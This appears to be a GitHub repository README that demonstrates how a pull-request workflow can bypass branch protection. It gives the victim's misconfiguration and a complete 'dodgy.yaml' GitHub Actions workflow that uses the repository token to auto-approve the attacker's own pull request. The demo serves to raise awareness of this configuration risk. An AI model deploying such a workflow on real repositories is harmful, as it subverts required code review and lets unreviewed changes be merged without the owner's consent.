# Bypassing Branch Protections with Github Actions

This is a demo show cases the bypassing of branch protection with GitHub Actions based on [YouTube video](https://www.youtube.com/watch?v=UbfhVXJn6fk)

![image](https://github.com/tuladhar/bypassing-branch-protections-with-github-actions/assets/5674762/57996f5e-c009-458d-bb09-e6fd9658daf7)

## How it works?

### Victim
1. Configure the repository to allow GitHub Actions to approve PRs
![image](https://github.com/tuladhar/bypassing-branch-protections-with-github-actions/assets/5674762/61bcbfa6-fe76-4e6d-90f4-85ea70de7e1c)

> NOTE: As per the [blog posted on May 3rd, 2022 by GitHub](https://github.blog/changelog/2022-05-03-github-actions-prevent-github-actions-from-creating-and-approving-pull-requests/)https://github.blog/changelog/2022-05-03-github-actions-prevent-github-actions-from-creating-and-approving-pull-requests/. New repository by default comes with above setting turned off.

2. Configure branch protection on `main` branch.
<img width="821" alt="Screen Shot 2023-06-18 at 11 48 56 AM" src="https://github.com/tuladhar/bypassing-branch-protections-with-github-actions/assets/5674762/f422d785-5e1c-4c9b-ae7c-eb919c94dcaf">

### Attacker
1. Creates a branch with malicious actions workflow file: `dodgy.yaml`
```
name: APPROVE

on: pull_request

permissions:
  pull-requests: write

jobs:
  approve:
    runs-on: ubuntu-latest    
    steps:
    - run: |
        curl --request POST \
        --url https://api.github.com/repos/${{github.repository}}/pulls/${{github.event.number}}/reviews \
        --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
        --header 'content-type: application/json' \
        -d '{"event": "APPROVE"}'
```
2. Creates a pull request from malicious branch and behind the scene:
- Workflow is triggered on new PR
- `approve` job is executed against the PR
- `github-actions[bot]` automatically approves the PR
- Attacker is able to merge the PR without victim's consent and bypassing branch protection requiring 1 approval.
